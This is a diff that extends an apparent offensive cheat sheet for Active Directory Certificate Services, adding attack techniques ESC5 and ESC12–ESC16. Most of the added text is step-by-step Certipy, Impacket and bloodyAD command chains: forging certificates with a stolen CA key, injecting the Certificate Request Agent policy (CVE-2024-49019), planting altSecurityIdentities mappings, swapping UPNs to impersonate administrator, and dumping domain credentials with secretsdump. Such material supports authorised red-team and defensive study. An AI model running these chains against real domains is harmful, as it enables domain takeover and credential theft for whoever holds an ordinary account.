@@ -119,16 +119,36 @@ certipy template -u $USER@$DOMAIN -p $PASSWORD \
   -template $TEMPLATE -configuration <old-config>
 ```
 
+## ESC5: Vulnerable PKI Object Access Control
+
+**Conditions:**
+- Write permissions on PKI AD objects under `CN=Public Key Services,CN=Services,CN=Configuration,...`
+- Objects in scope: NTAuthCertificates, Enrollment Services objects, CA objects, certificate templates container, AIA/CDP containers
+
+ESC5 is a catch-all for dangerous ACLs on PKI infrastructure rather than on individual templates. Exploitation depends on which object you have write on: write on the CA Enrollment Services object chains to ESC7 (grant yourself ManageCA/ManageCertificates), write on NTAuthCertificates lets you add a rogue CA cert and forge trusted certificates, write on the templates container lets you create new ESC1-vulnerable templates.
+
+```bash wrap
+# Certipy detects ESC5 during its vulnerable scan
+certipy find -u $USER@$DOMAIN -p $PASSWORD -dc-ip $DC_IP -vulnerable -stdout
+# Look for "Object Control Permissions" on CA/PKI objects
+
+# If you have write on the CA Enrollment Services object: add yourself as officer
+certipy ca -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -target $CA_HOST -ca $CA \
+  -add-officer $USER
+# Then chain to ESC6 (enable EDITF) or ESC7 (issue/approve requests)
+```
+
 ## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
 
 **Conditions:**
 - CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set
 - Any template with Client Authentication EKU is exploitable
 
-This flag on the CA makes every Client Authentication template behave like ESC1: request any template with client auth EKU and supply an arbitrary SAN.
+This flag on the CA makes every Client Authentication template behave like ESC1: request any template with client auth EKU and supply an arbitrary SAN. On DCs with KB5014754 applied, the UPN in the SAN is ignored unless the certificate also lacks the SID security extension. On patched environments combine with ESC9 (template disables extension) or ESC16 (CA disables extension).
 
 ```bash wrap
-# Works like ESC1: request any template with client auth
+# Works like ESC1 on unpatched DCs, or when combined with ESC9/ESC16
 certipy req -u $USER@$DOMAIN -p $PASSWORD \
   -dc-ip $DC_IP \
   -target $CA_HOST \
@@ -247,6 +267,138 @@ ntlmrelayx.py -t rpc://$CA_HOST -rpc-mode ICPR \
 
 # Coerce auth then authenticate with cert
 certipy auth -pfx dc.pfx -dc-ip $DC_IP
+```
+
+## ESC12: CA Key Compromise (Golden Certificate)
+
+**Conditions:**
+- Admin or SYSTEM access on the CA server
+
+With the CA private key you can forge valid certificates for any principal in the domain. Forged certs bypass template restrictions and enrolment logs entirely.
+
+```bash wrap
+# Back up the CA private key and certificate (requires admin on CA server)
+certipy ca -u $USER@$DOMAIN -p $PASSWORD \
+  -target $CA_HOST -ca $CA \
+  -backup
+
+# Forge a certificate for any user
+certipy forge -ca-pfx $CA.pfx \
+  -upn administrator@$DOMAIN \
+  -sid S-1-5-21-...-500
+
+# Authenticate with the forged cert
+certipy auth -pfx administrator_forged.pfx -dc-ip $DC_IP
+```
+
+## ESC13: OID Group Link
+
+**Conditions:**
+- Principal has enrolment rights on the template
+- Template has an issuance policy in `msPKI-Certificate-Policy`
+- That issuance policy has `msDS-OIDToGroupLink` pointing to a privileged universal group
+- The linked group is empty and has universal scope
+- Template has a client authentication EKU
+
+When the DC processes Kerberos authentication it sees the issuance policy OID in the cert and injects the linked group's SID into the PAC. You gain effective group membership at authentication time without being listed as a member in AD.
+
+```bash wrap
+# Request certificate from the vulnerable template
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -target $CA_HOST \
+  -ca $CA -template $TEMPLATE
+
+# Authenticate: the returned TGT carries the linked group's SID in the PAC
+certipy auth -pfx $USER.pfx -dc-ip $DC_IP
+```
+
+## ESC14: Explicit Certificate Mapping
+
+**Conditions (ESC14A):**
+- Write access on a target account's `altSecurityIdentities` attribute
+
+`altSecurityIdentities` is the explicit certificate-to-account binding attribute. You map a certificate you control to a target account, then authenticate as that account using your cert. The serial number must be hex-reversed in the mapping format.
+
+```bash wrap
+# Step 1: Create a machine account and request a machine cert
+addcomputer.py -method ldaps -computer-name 'attacker$' \
+  -computer-pass $COMP_PASS -dc-ip $DC_IP $DOMAIN/$USER:$PASSWORD
+
+certipy req -u 'attacker$'@$DOMAIN -p $COMP_PASS \
+  -dc-ip $DC_IP -target $CA_HOST \
+  -ca $CA -template Machine
+
+# Step 2: Extract issuer DN and serial number
+certipy cert -pfx attacker.pfx -nokey -out attacker.crt
+openssl x509 -in attacker.crt -noout -text
+
+# Step 3: Write the mapping to the target (requires write on altSecurityIdentities)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object $TARGET altSecurityIdentities \
+  -v "X509:<I>DC=local,DC=$DOMAIN,CN=$CA<SR>$SERIAL_HEX_REVERSED"
+
+# Step 4: Authenticate as the target using the attacker cert
+gettgtpkinit.py -cert-pfx attacker.pfx \
+  -dc-ip $DC_IP $DOMAIN/$TARGET $TARGET.ccache
+export KRB5CCNAME=$TARGET.ccache
+secretsdump.py -k -no-pass $DOMAIN/$TARGET@$DC_HOST
+```
+
+## ESC15: Arbitrary Application Policy Injection
+
+**Conditions:**
+- Template has schema version 1
+- Principal has enrolment rights
+- No manager approval required
+
+(CVE-2024-49019) Version 1 templates do not validate the Application Policy extension in the CSR. Since Application Policy takes precedence over EKU when both are present, injecting the Certificate Request Agent OID (`1.3.6.1.4.1.311.20.2.1`) into any enrollable v1 template turns it into an enrolment agent cert, enabling the ESC3 step-2 chain.
+
+```bash wrap
+# Step 1: Request cert with Certificate Request Agent application policy injected
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -target $CA_HOST \
+  -ca $CA -template $TEMPLATE \
+  --application-policies "1.3.6.1.4.1.311.20.2.1"
+
+# Step 2: Use the agent cert to request on behalf of admin (ESC3 step 2)
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -target $CA_HOST \
+  -ca $CA -template User \
+  -on-behalf-of $DOMAIN\\administrator \
+  -pfx $USER.pfx
+
+# Step 3: Authenticate
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP
+```
+
+## ESC16: CA-Wide SID Extension Removal
+
+**Conditions:**
+- CA has `szOID_NTDS_CA_SECURITY_EXT` (OID `1.3.6.1.4.1.311.25.2`) in its `DisableExtensionList`
+- `StrongCertificateBindingEnforcement` is not 2 on DCs, or KB5014754 not applied
+
+ESC16 is ESC9 at the CA level: every certificate issued by this CA lacks the SID security extension regardless of template configuration, making every enrollable template with client auth exploitable via UPN swap.
+
+```bash wrap
+certipy find -u $USER@$DOMAIN -p $PASSWORD -dc-ip $DC_IP -vulnerable -stdout
+# Flags "ESC16" on the CA entry
+
+# Exploit: same path as ESC9
+# Step 1: Change target's UPN to the account you want to impersonate
+certipy account update -u $USER@$DOMAIN -p $PASSWORD \
+  -user $TARGET -upn administrator@$DOMAIN
+
+# Step 2: Request a cert as the target
+certipy req -u $TARGET@$DOMAIN -p $TARGET_PASSWORD \
+  -dc-ip $DC_IP -target $CA_HOST \
+  -ca $CA -template $TEMPLATE
+
+# Step 3: Restore the original UPN
+certipy account update -u $USER@$DOMAIN -p $PASSWORD \
+  -user $TARGET -upn $TARGET@$DOMAIN
+
+# Step 4: Authenticate as administrator
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP -domain $DOMAIN
 ```
 
 ## Post-Exploitation with Certificates
